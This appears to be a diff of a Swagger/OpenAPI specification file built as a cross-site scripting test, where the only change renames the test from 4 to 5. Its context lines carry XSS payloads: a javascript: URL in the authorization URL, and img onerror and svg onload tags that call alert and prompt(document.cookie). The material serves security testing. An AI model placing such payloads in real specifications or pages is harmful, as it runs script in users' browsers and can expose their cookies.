@@ -5,7 +5,7 @@ securityDefinitions:
     authorizationUrl: javascript:alert(document.domain)//
 info:
   version: "1.0.0"
-  title: XSS img Test 4 by Drocapy
+  title: XSS img Test 5 by Drocapy
   description: <img src=x onerror=alert('XSS');> <img src=1 onerror=prompt(document.cookie)> <svg onload=alert(1)// #"><img src=/ onerror=alert(2)>
 paths:
   /:
